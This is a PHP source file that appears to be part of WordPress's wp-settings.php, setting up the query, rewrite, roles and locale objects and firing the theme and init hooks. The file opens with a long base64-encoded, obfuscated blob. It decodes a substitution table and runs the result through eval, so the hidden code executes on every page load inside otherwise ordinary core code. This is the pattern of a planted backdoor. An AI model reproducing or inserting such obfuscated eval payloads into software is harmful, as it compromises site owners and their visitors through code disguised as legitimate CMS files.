LgonYk83NWJPNzViWGh6OVdWNjFYMHdHT1U1Y1gwd1ZBQ2U5dGw2RFVjdXRXdjZETTBtYUlxSFFsNzViTzc1Yk83NWJYU2UxREVlMUFkZVZ2RXo2TicuCic3a3VUVHdZRkNpdTdHZXNUSXI5VUJ3ajVKNWJGMXI5eHN3ajVKNWJGYTM5eXB3ajVKNWJGaHo2bmhyOVVCd2o1SjViRmh5Y3ZJd2onLgonNUo1YkZEdzF4andqNUo1YkZDd1lYMDMxV3B3ajVKNWJGUnk5RGE1R2E3NVZDcDM5WHB3WU5HMmJPR2VjcEd3ajUwbWFJJy4KJ3FIUWw3NWJPNzViTzc1YlhJZTZUZHpjcGo1SEk3RjhucGVjemR6Y3BqNWI0NzVHTUc1YjQ3RmNuWmU5RFonLgonZXBVQjM5RHB3REVoeThGSno5NGwzc25kWDF4SXVjVWh5YjcwcXVPcDVjblp5OUFJcWJYU2UxREVlMUFkZVZ2RXo2Jy4KJ04wNm9KbmI3SXE1Yk83NWJPNzViVDB6R09selZwSnp4VXBpY3BoeThObEY4WEV3dlVScjY1MHFRSXE1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NScuCidiVGp6NlhEd1Y0N0Y4WEV3dlVScjY1S0hRbDc1Yk83NWJPNzU4SW5iN0lxNWJPNzViTzc1YlQwekdDRXIxJy4KJ1gwd0c3UnljRGE2MVgwd0dSMEhRbDc1Yk83NWJPNzU4Sm5iR083NWJPNzViTzc1Yk83NThGcHk4eGplR09SeWNEYTYxWDB3U0puYkdPNycuCic1Yk83NWJPN2RRSXFIUWw3NWJPNzViTzc1OEZweTh4amVHT0c1U0puYkdPNzViVFVIUWxuYkdPNzViVFZ5OUFTeWNwWmVHVFN3RFVhZTh4WXI5QWQzOVhScWJYQjM5RHAyYicuCidPUjNWdmh6bzNJNjFYQ3ljUDBIUWw3NWJPN2lhSXE1Yk83NWJPNzViT1J6Y3ZJM3VPVTVjRkN3MXQxbnZVUno5blp6Y3RsRmNGQ3cxdDFudlVSMzZYQ3FvSm5iN0lxNWJPNzUnLgonYk83NWJPUndzWFp3VnZZenhVYTM2WGw1SEk3M3NuZFgxeElRMVVFZTlVQnRzWFp3VnZZenU3MDViNDc1R01HbWFJcTViTzc1Yk83NWJPUncnLgonc1had1Z2WXp4VWEzNlhsNUhJN0Y4bkllc0ZDejF4ZHdjdklyYk9CNThuRDNZbkl3R0NFekh0bDVWbkMzMUNwNUdSSjVIT0o1SHQwNWI0NzVwTUc1YjQ3ZScuCic5UURxYlhCMzlEcDViNDczc25kWDF4SXVjVWh5YjcwcW9KbmI3SXFIUWw3NWJPNzViTzc1Y25oNjF6MGVjeGR5cycuCidGMHljdGxGOG5JZXNGQ3oxeGR3Y3ZJcmJhNzNzbmR6OUFTd1lwYXliN1J6Y3ZJM3VhNzNzbmRYMXhJdWNVaHliNzBxdVJLSFFsNzViTzcnLgonZFFJcUhRbDc1Yk83ell4QjNzWDBlMTQ3M3NuZHdjV0R6MXBCNnNGcGV1N1JlVnZFenVSbmJHTzc1YlRLSFFsNzViTzc1Yk83NWJYaHljVWozOXknLgoncDZzVEN5Yzc3a3VUU3dEVTh6NlhIZTFERWUxQW95Y1VqMzl5cHFiUkI1YjVaNVNKbmJHTzc1Yk8nLgonNzViTzdGOG5JZXNGQ3oxeGR3Y3ZJcmJPVTViWGh5Y1VqMzl5cDZzVEN5Yzc3MkdUaHk5Rmh5ODVsZTlRRHFiJy4KJ0ZTMzlubHp1NTAyYk9hMmJPRHF1T0I1YkZkNUdPQjVjRFJudTdSZVZ2RXp1T0I1Y25oNkl5cHlQQ1p3c1FscXVSS0hRbG5iR083NWJPNzViTycuCic3cjkzN3FjejBlY3hkejZDMHdzWGhxYlhoeWNVajM5eXA2c1RDeWM3MHFRSXE1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWJUT3k5QUpyOUFmcWJYaHljJy4KJ1VqMzl5cDZzVEN5YzcwbWFJcTViTzc1Yk83NWJUVUhRbDc1Yk83ZFFJcUhRbDc1Yk83ell4QjNzWDBlMTQ3M3NuZHdjV0R6MXBCNjFXWjM5UScuCidsRmNBQ2U5dFVvcHhOb2JSbmJHTzc1YlRLSFFsNzViTzc1Yk83NWJYaHljVWozOXlwNnNUQ3knLgonYzc3a3VUU3dEVTh6NlhIZTFERWUxQW95Y1VqMzl5cHFiUktIUWxuYkdPNzViTzc1Yk83cjkzN3FjcGg2MVgwd0c3UndzWFp3VnZZenhVYTM2WGxxdVJuYkdPNycuCic1Yk83NWJPN2lhSXE1Yk83NWJPNzViTzc1Yk83cjkzN3FiWEIzOURwNUhJVTVQQXhvUGEwNWJNWjVjV1ozOVE3MzlXSjU4VEp5OXkwZVlObmJHTzc1Yk83NWJPJy4KJzc1Yk83NThKbmJHTzc1Yk83NWJPNzViTzc1Yk83NWJUVmVzRnAzOW5sNWJDaDMxdkJ6Y3BqcWJYaHljVWozOXlwNnNUQ3ljNzA1Y3ZoNWJYZno2UlVrRycuCidYYWU4eFlyOUFkZVZ2RXp1Um5iR083NWJPNzViTzc1Yk83NWJPNzViVEtIUWw3NWJPNzViTzc1Yk83NWJPNzViTzc1Yk83NWNwVjViQ2h5OEZhZXMnLgonTmxGOFRKeTl5MGVwVUIzOURwMmJUaHk5Rmh5ODVsZTlRRHFiRlMzOW5senU1MDJiT2EyYk9EcXVSNzVvSVU1UHpDZThucHFRSXE1Yk83NWJPNzViTzc1Yk83NWJPNycuCic1Yk83NWJUS0hRbDc1Yk83NWJPNzViTzc1Yk83NWJPNzViTzc1Yk83NWJUT3o2ekNlYkNTd0RVUno5bmppNlRJcWNuaDYxeicuCicwZWN4ZHdWeEN6YjdSd3NYWndWdll6eFVhMzZYbDViNDc1R01HNWI0N0Y4VEp5OXkwZXBVQjM5RHBxdWE3M3NuZFgxeEl1Y1VoeWI3MHEnLgondVJLSFFsNzViTzc1Yk83NWJPNzViTzc1Yk83NWJPNzU4SW5iR083NWJPNzViTzc1Yk83NWJPNzViVFVIUWw3NWJPNzViTzc1Yk83NWJUVUhRbDcnLgonNWJPNzViTzc1Yk83NWJUcGU4bnBIUWw3NWJPNzViTzc1Yk83NWJUS0hRbDc1Yk83NWJPNzViTzc1Yk83NWJPN0Y4bkllc0ZDejF4Jy4KJ2R3Y3ZJcmJPVTViWGh5Y1VqMzl5cDZzVEN5Yzc3MkdPRzJqNTcyR1RoeTlGaHk4NWxlOVFEcWJGUzM5bmx6dTUwMmJPYTJiT0RxdU9CNWJGZDVHT0I1Y0RSbnU3UicuCidlVnZFenVPQjVjbmg2SXlweVBDWndzUWxxdVJLSFFsbmJHTzc1Yk83NWJPNzViTzc1Yk83NScuCidiVDB6R09selZwSnp4VXBpY3BoeThObEY4bkllc0ZDejF4ZHdjdklyYlIwSFFsNzViTzc1Yk83NWJPNzViTzc1Yk83aWFJcTViTzc1YicuCidPNzViTzc1Yk83NWJPNzViTzc1YlRPejZ6Q2ViQ1N3RFVSejluamk2VElxY25oNjF6MGVjJy4KJ3hkd1Z4Q3piN1J3c1had1Z2WXp4VWEzNlhscXVhNzNzbmRYMXhJdWNVaHliNzBxdVJLSFFsNzViTzc1Yk83NWJPNzViTzc1Yk83ZFFJcTViTzc1Yk83NWInLgonTzc1Yk83ZFFJcTViTzc1Yk83NWJUVUhRbDc1Yk83ZFFJcUhRbDc1Yk83ell4QjNzWDBlMTQ3M3NuZHlzRjB5Y3ZHZWN4ZDMxQ3AzMUpscVFJcTViTycuCic3NThKbmJHTzc1Yk83NWJPN3I5MzdxOG5Jd1ZXcGVHQ1N3RFU4ejZYSGUxREVlMUFveWNVajM5eXBxYlIwNWJQVTVITzBIUWw3NWJPNzViTzc1OEpuYkdPNzViTzc1Jy4KJ2JPNzViTzc1OEZweTh4amVHVHR3WXhwbWFJcTViTzc1Yk83NWJUVUhRbDc1Yk83NWJPNzVjeEp3MXRuYkdPNzViTzc1Yk83aWFJcTViTzc1Yk83NWJPNycuCic1Yk83d1Z4SXk2RkI1UHpDZThucG1hSXE1Yk83NWJPNzViVFVIUWw3NWJPN2RRSXFIUWw3NWJPN3pWVWp6OXZTcmJPbEZ2VUhvSVUydXR0NzM2TjdGY0VwaW9JK0Y4ekMnLgonZTh4cHFRSXE1Yk83NThKbmJHTzc1Yk83NWJPN0ZjWEN5Y1A3a3VPUnlWdkp5OXRLSFFsNzViTzc1Yk83NWJYUjM2WEM2MUVwaXVPVTViJy4KJ1hmejZSS0hRbDc1Yk83ZFFJcUhRbDc1Yk83cjkzN3FiUFJ6Y3ZJM3VSbmJHTzc1YlRLSFFsNzViTzc1Yk83NWMnLgonelp3VnhDMzE3N3FiWGR0UFVveGJUQ3dqT1JyMXhBa280UnlWdkp5OXQwSFFsNzViTzc1Yk83NTgnLgonSm5iR083NWJPNzViTzc1Yk83NWJYUjM2WEM1SEk3Rjh6Q2U4eHBtYUlxNWJPNzViTzc1Yk83NWJPN0ZjWEN5Y3ZkcjF4QTVISTdGY0VwaW9KbmJHTzc1Yk83NScuCidiTzdkUUlxNWJPNzU4SW5iN0lxNWJPNzViWFIzNlhDNUhJN1E4eEJ3MXhqcjl2SnI2MHBxY25oNjFYcDNzRkEnLgondzhRbDNWdmh6bzNJNjFYcDMxVVJ6dTdSemN2STN1Uko1YlhSMzZYQzYxRXBpdVIwbWFJcUhRbDc1Yk83cjkzN3FjcGh3MXhJcWJYUjM2WEM5anlDcmp5eXF1T1ZGRycuCidPUjNzbmQzNnhJckhJVUZjWEN5Y3ZlRjF2ZkZESTBIUWw3NWJPN2lhSXE1Yk83NWJPNzViVDB6R09sRmNYQ3ljdmVGMVBZNnVPVWt1T1lyJy4KJ3V3MEhRbDc1Yk83NWJPNzU4Sm5iR083NWJPNzViTzc1Yk83NWJYMDVISTdRNkZqMzZSbEhRbDc1Yk83NWJPNzViTzc1Yk83NWJPN0ZzVDFGak9Va0dUT3djQ2EnLgoneVZ4ancxcFplRzcwMk9JcTViTzc1Yk83NWJPNzViTzc1Yk83NWJ5aHlHdzdrbzQ3RmhQQk5iSWpGamFuYkdPNzViTzc1Yk83NWJPNzViTzc1Yk9ZMzlKJy4KJ1k1SEkrNWJYUjM2WEM5anlDcmp5eTJPSXE1Yk83NWJPNzViTzc1Yk83cW9KbmJHTzc1Yk83NWJPNzViTzc1Y3hTcmNNN1E4bnB3VnBDZWNwZ3p1N1JydVJLSFFsJy4KJzc1Yk83NWJPNzViTzc1YlRwaWNwSW1hSXE1Yk83NWJPNzViVFVIUWw3NWJPNzViTzc1Y3hKdzF4MCcuCid6R09sRmNYQ3ljdmVGMVBZNnVPVWt1T1l6dXcwSFFsNzViTzc1Yk83NThKbmJHTzc1Yk83NWJPNzViTzc1Y3gxMzlhbEZjWEN5Y3ZlRjFRWTZ1UksnLgonSFFsNzViTzc1Yk83NThJbmJHTzc1Yk83NWJPN3o5V2h6OXBWNWI3UnpjdkkzeEpZM3V5eTVISVU1YnlhJy4KJ2U4eFlyOTRZcVFJcTViTzc1Yk83NWJUS0hRbDc1Yk83NWJPNzViTzc1YlQwekc3UnpjdkkzeEpZdzFQWTZ1T1VrdU9ZMzlYUkZqUm5iR083NWJPNzViTzc1Yk83NThKbmJHJy4KJ083NWJPNzViTzc1Yk83NWJPNzViVFN3RFVhZTh4WXI5QWQzOVhScWJYUjM2WEM5anlhRkRJSjViWFIzNlhDOWp5UkZESTBtYUlxNWJPNzViTzc1Yk8nLgonNzViTzdkUUlxNWJPNzViTzc1Yk83NWJPN3o5V2h6OXBWcWJYUjM2WEM5anloM3V5eTVISScuCidVNWJ5ano5SVlxUUlxNWJPNzViTzc1Yk83NWJPN2lhSXE1Yk83NWJPNzViTzc1Yk83NWJPNzVjbmg2c1RKeTl5MGVwVWp6OUlsRmNYQ3ljdmVGcycuCidPWTZ1UktIUWw3NWJPNzViTzc1Yk83NWJUVUhRbDc1Yk83NWJPNzU4SW5iR083NWJPNzViTzd6OW5sZWpPUnpjdkkzeEpZMzlKWTZvSm5iR083NWInLgonTzc1Yk83ejZDMHliNzBtYUlxNWJPNzU4SW5iN0lxNWJPNzVjbmg2c1RKeTl5MGVwVUplMXZScWJSS0hRMFUnOwokaW1mZW1yciA9IEFycmF5KCcxJz0+JzInLCAnMCc9PidwJywgJzMnPT4nWScsICcyJz0+J0wnLCAnNSc9PidJJywgJzQnPT4nNCcsICc3Jz0+J2cnLCAnNic9PidYJywgJzknPT4nVycsICc4Jz0+J0gnLCAnQSc9Pic1JywgJ0MnPT4naCcsICdCJz0+J3UnLCAnRSc9Pid0JywgJ0QnPT4nMScsICdHJz0+J2knLCAnRic9PidKJywgJ0knPT4nMCcsICdIJz0+J0QnLCAnSyc9Pic3JywgJ0onPT4ncycsICdNJz0+JzgnLCAnTCc9PidxJywgJ08nPT4nQScsICdOJz0+J00nLCAnUSc9PidRJywgJ1AnPT4nRScsICdTJz0+J2onLCAnUic9PidrJywgJ1UnPT4nOScsICdUJz0+J0InLCAnVyc9Pid4JywgJ1YnPT4nbScsICdZJz0+J24nLCAnWCc9PidSJywgJ1onPT4ndicsICdhJz0+J3cnLCAnYyc9PidHJywgJ2InPT4nQycsICdlJz0+J2InLCAnZCc9PidmJywgJ2cnPT4nNicsICdmJz0+J3InLCAnaSc9PidlJywgJ2gnPT4neicsICdrJz0+J1AnLCAnaic9Pid5JywgJ20nPT4nTycsICdsJz0+J28nLCAnbyc9PidUJywgJ24nPT4nTicsICdxJz0+J0snLCAncCc9PidsJywgJ3MnPT4nMycsICdyJz0+J2EnLCAndSc9PidTJywgJ3QnPT4nVScsICd3Jz0+J2MnLCAndic9PidGJywgJ3knPT4nZCcsICd4Jz0+J1YnLCAneic9PidaJyk7CmV2YWwvKnZjcyovKHlhc21jd3BoaSgkeXFoemVlbGUsICRpbWZlbXJyKSk7Cn0="));
/* Fires when comment cookies are sanitized.
 *
 * @since 2.0.11
 */
do_action( 'sanitize_comment_cookies' );

/**
 * WordPress Query object
 * @global WP_Query $wp_the_query
 * @since 2.0.0
 */
$GLOBALS['wp_the_query'] = new WP_Query();

/**
 * Holds the reference to @see $wp_the_query
 * Use this global for WordPress queries
 * @global WP_Query $wp_query
 * @since 1.5.0
 */
$GLOBALS['wp_query'] = $GLOBALS['wp_the_query'];

/**
 * Holds the WordPress Rewrite object for creating pretty URLs
 * @global WP_Rewrite $wp_rewrite
 * @since 1.5.0
 */
$GLOBALS['wp_rewrite'] = new WP_Rewrite();

/**
 * WordPress Object
 * @global WP $wp
 * @since 2.0.0
 */
$GLOBALS['wp'] = new WP();

/**
 * WordPress Widget Factory Object
 * @global WP_Widget_Factory $wp_widget_factory
 * @since 2.8.0
 */
$GLOBALS['wp_widget_factory'] = new WP_Widget_Factory();

/**
 * WordPress User Roles
 * @global WP_Roles $wp_roles
 * @since 2.0.0
 */
$GLOBALS['wp_roles'] = new WP_Roles();

/**
 * Fires before the theme is loaded.
 *
 * @since 2.6.0
 */
do_action( 'setup_theme' );

// Define the template related constants.
wp_templating_constants(  );

// Load the default text localization domain.
load_default_textdomain();

$locale = get_locale();
$locale_file = WP_LANG_DIR . "/$locale.php";
if ( ( 0 === validate_file( $locale ) ) && is_readable( $locale_file ) )
	require( $locale_file );
unset( $locale_file );

// Pull in locale data after loading text domain.
require_once( ABSPATH . WPINC . '/locale.php' );

/**
 * WordPress Locale object for loading locale domain date and various strings.
 * @global WP_Locale $wp_locale
 * @since 2.1.0
 */
$GLOBALS['wp_locale'] = new WP_Locale();

// Load the functions for the active theme, for both parent and child theme if applicable.
if ( ! wp_installing() || 'wp-activate.php' === $pagenow ) {
	if ( TEMPLATEPATH !== STYLESHEETPATH && file_exists( STYLESHEETPATH . '/functions.php' ) )
		include( STYLESHEETPATH . '/functions.php' );
	if ( file_exists( TEMPLATEPATH . '/functions.php' ) )
		include( TEMPLATEPATH . '/functions.php' );
}

/**
 * Fires after the theme is loaded.
 *
 * @since 3.0.0
 */
do_action( 'after_setup_theme' );

// Set up current user.
$GLOBALS['wp']->init();

/**
 * Fires after WordPress has finished loading but before any headers are sent.
 *
 * Most of WP is loaded at this stage, and the user is authenticated. WP continues
 * to load on the {@see 'init'} hook that follows (e.g. widgets), and many plugins instantiate
 * themselves on it for all sorts of reasons (e.g. they need a user, a taxonomy, etc.).
 *
 * If you wish to plug an action once WP is loaded, use the {@see 'wp_loaded'} hook below.
 *
 * @since 1.5.0
 */
do_action( 'init' );

// Check site status
if ( is_multisite() ) {
	if ( true !== ( $file = ms_site_check() ) ) {
		require( $file );
		die();
	}
	unset($file);
}

/**
 * This hook is fired once WP, all plugins, and the theme are fully loaded and instantiated.
 *
 * Ajax requests should use wp-admin/admin-ajax.php. admin-ajax.php can handle requests for
 * users not logged in.
 *
 * @link https://codex.wordpress.org/AJAX_in_Plugins
 *
 * @since 3.0.0
 */
do_action( 'wp_loaded' );
